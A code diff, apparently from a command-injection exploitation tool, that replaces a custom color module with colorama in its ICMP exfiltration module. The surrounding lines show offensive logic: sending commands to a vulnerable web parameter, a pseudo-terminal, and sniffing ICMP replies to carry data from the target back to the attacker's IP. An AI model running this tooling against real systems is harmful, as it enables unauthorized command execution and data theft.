@@ -24,8 +24,8 @@ import urllib2
 import threading
 
 from src.utils import menu
-from src.utils import colors
 from src.utils import settings
+from src.thirdparty.colorama import Fore, Back, Style, init
 
 from src.core.requests import headers
 from src.core.requests import parameters
@@ -53,8 +53,8 @@ def signal_handler(signal, frame):
   sys.exit(0)
 
 def snif(ip_dst,ip_src):
-  print( colors.BOLD + "(!) Started the sniffer between " + colors.YELLOW + ip_src + colors.RESET + colors.BOLD + 
-        " and " + colors.YELLOW + ip_dst + colors.RESET + colors.BOLD + "." + colors.RESET)
+  print( Style.BRIGHT + "(!) Started the sniffer between " + Fore.YELLOW + ip_src + Style.RESET_ALL + Style.BRIGHT + 
+        " and " + Fore.YELLOW + ip_dst + Style.RESET_ALL + Style.BRIGHT + "." + Style.RESET_ALL)
   
   while True:
     sniff(filter = "icmp and src " + ip_dst, prn=packet_handler, timeout=settings.DELAY)
@@ -71,10 +71,10 @@ def cmd_exec(http_request_method,cmd,url,vuln_parameter,ip_src):
     data = urllib.urlencode(values)
     req = urllib2.Request(url=url,data=data)
     
-  sys.stdout.write(colors.GREEN + colors.BOLD + "\n")
+  sys.stdout.write(Fore.GREEN + Style.BRIGHT + "\n")
   response = urllib2.urlopen(req)
   time.sleep(2)
-  sys.stdout.write("\n" + colors.RESET)
+  sys.stdout.write("\n" + Style.RESET_ALL)
   
 def input_cmd(http_request_method,url,vuln_parameter,ip_src):
   print "\nPseudo-Terminal (type 'q' or use <Ctrl-C> to quit)"
@@ -102,7 +102,7 @@ def exploitation(ip_dst,ip_src,url,http_request_method,vuln_parameter):
 def icmp_exfiltration_handler(url,http_request_method):
   # You need to have root privileges to run this script
   if os.geteuid() != 0:
-    print colors.BGRED + "\n(x) Error:  You need to have root privileges to run this option.\n" + colors.RESET
+    print Back.RED + "\n(x) Error:  You need to have root privileges to run this option.\n" + Style.RESET_ALL
     sys.exit(0)
 
   if http_request_method == "GET":
@@ -127,13 +127,13 @@ def icmp_exfiltration_handler(url,http_request_method):
       urllib2.install_opener(opener)
       response = urllib2.urlopen(request)
     except urllib2.HTTPError, err:
-      print "\n" + colors.BGRED + "(x) Error : " + str(err) + colors.RESET
+      print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
       sys.exit(1) 
   else:
     try:
       response = urllib2.urlopen(request)
     except urllib2.HTTPError, err:
-      print "\n" + colors.BGRED + "(x) Error : " + str(err) + colors.RESET
+      print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
       sys.exit(1) 
 
   ip_data = menu.options.ip_icmp_data
